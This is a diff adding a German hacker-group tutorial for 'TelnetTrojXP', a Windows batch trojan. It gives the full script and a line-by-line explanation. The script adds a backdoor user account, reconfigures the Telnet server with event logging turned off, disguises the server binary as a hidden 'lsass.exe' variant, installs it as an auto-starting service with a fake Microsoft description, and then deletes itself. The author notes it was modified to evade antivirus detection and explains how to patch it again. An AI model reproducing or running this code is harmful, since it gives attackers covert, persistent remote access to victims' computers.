@@ -1,0 +1,121 @@
+
+
+TelnetTrojXP (gepacht) by Mr Hawk
+[BAD R.A.T.]-Company
+www.bad-rat.de.vu
+
+Beschreibung:
+=============
+
+Vor längerer Zeit hat Heroin ein Batch geschrieben, welches automatisch den Telnetserver startet.
+Damit kann man dann Zugriff auf einen anderen Rechner bewirken.
+Leider wird diese Batch erkannt, also habe ich einiges geändert und nun wird es nicht mehr erkannt.
+
+Falls auch diese Batch erkannt wird, will ich es erklären, wie man das Ganze "patchen" kann.
+
+
+Quellcode:
+=========
+
+---------------------8<-------------------------------
+net localgroup Telnet /add   
+net user newadmin mypass /add 
+net localgroup Telnet newadmin /add 
+cd %windir%\system32 
+ECHO Windows Registry Editor Version 5.00>0.reg 
+ECHO [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\TelnetServer\1.0]>>0.reg
+ECHO "TelnetPort"=dword:00000016>>0.reg 
+ECHO "EventLoggingEnabled"=dword:00000000>>0.reg 
+ECHO "DisconnectKillAllApps"=dword:00000000>>0.reg 
+ECHO [-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\TelnetServer\1.0\ReadConfig]>>0.reg
+ECHO [-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\TelnetServer\Defaults]>>0.reg
+regedit /s 0.reg && DEL 0.reg 
+copy %windir%\system32\tlntsvr.exe %windir%\system32\lsass.exeÿ
+attrib +r +h %windir%\system32\lsass.exeÿ
+assoc .exeÿ=exefile 
+sc create "XPT" binpath= "%windir%\system32\lsass.exeÿ" start= auto "lsass.exeÿ" /service 
+sc description XPT "Microsoft XPT" 
+sc start XPT 
+del %0.bat 
+---------------------8<-------------------------------
+
+Erklärung:
+=========
+
+
+net localgroup Telnet /add   
+-> Erstellt ne Benutzergruppe (in dem Fall "Telnet")
+
+net user newadmin mypass /add 
+-> erstellt ne konto. Name:newadmin Pass: mypass --> Kann beides geändert werden.
+ 
+net localgroup Telnet newadmin /add 
+->neues Konto zuweisen
+
+cd %windir%\system32 
+-> in das Systemverzeinis springen
+
+ECHO Windows Registry Editor Version 5.00>0.reg 
+->Regdatei erstellen
+
+ECHO [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\TelnetServer\1.0]>>0.reg
+ECHO "TelnetPort"=dword:00000016>>0.reg 
+->neuen Port festlegen (in dem Fall 22 ->in hex=16)
+
+ECHO "EventLoggingEnabled"=dword:00000000>>0.reg 
+->das mitloggen ausschalten
+
+ECHO "DisconnectKillAllApps"=dword:00000000>>0.reg 
+->damit alles Weiterläuft
+
+ECHO [-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\TelnetServer\1.0\ReadConfig]>>0.reg
+ECHO [-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\TelnetServer\Defaults]>>0.reg
+regedit /s 0.reg && DEL 0.reg 
+->Regdatei ausführen und dann löschen
+
+
+copy %windir%\system32\tlntsvr.exe %windir%\system32\"lsass.exeÿ" 
+->den Telnetserver nach "lsass.exeÿ" kopieren
+
+attrib +r +h %windir%\system32\lsass.exeÿ
+->Setzt Attribute auf schreibgeschützt (+r) und versteckt (+h)
+
+assoc .exeÿ=exefile 
+->exeÿ als neue ausführbare Endung registrieren
+
+sc create "XPT" binpath= "%windir%\system32\lsass.exeÿ" start= auto "lsass.exeÿ" /service 
+-> Als Service deklarieren.
+-> XPT kann geändert werden
+
+sc description XPT "Microsoft XPT" 
+-> Eine Beschreibung, kann man auch weglassen
+
+sc start XPT 
+-> den Service starten
+
+del %0.bat 
+-> diese Batch löscht sich dann selber
+
+
+Einloggen:
+=========
+
+Dos-Konsole öffnen und per Telnet connecten.
+
+c:>telnet 127.0.0.1 21
+
+login: newadmin 
+pass: mypass
+
+
+Schlusswort:
+============
+
+
+So, nun sollte es kein Problem mehr sein, ein Batch zuschreiben, welches nicht erkannt wird. 
+Wem das zu aufwendig ist, der kann auch mit dem TNT_XP_Gen solch ein Script erzeugen lassen.
+Wer lieber mit exen spielt, der kann per "bat2exe" das fertige Script in ne Exe umwandeln.
+Bat2exe gibts unter http://www.antonis.de (http://www.antonis.de/dos/download/bat2exe.zip)
+Viel Spaß wünscht Mr Hawk [BAD R.A.T.]-Company
+
+PS: Der Autor distanziert sich von jeder Haftung für eventuell entstehenden Schaden. Der User ist selbstverantwortlich!
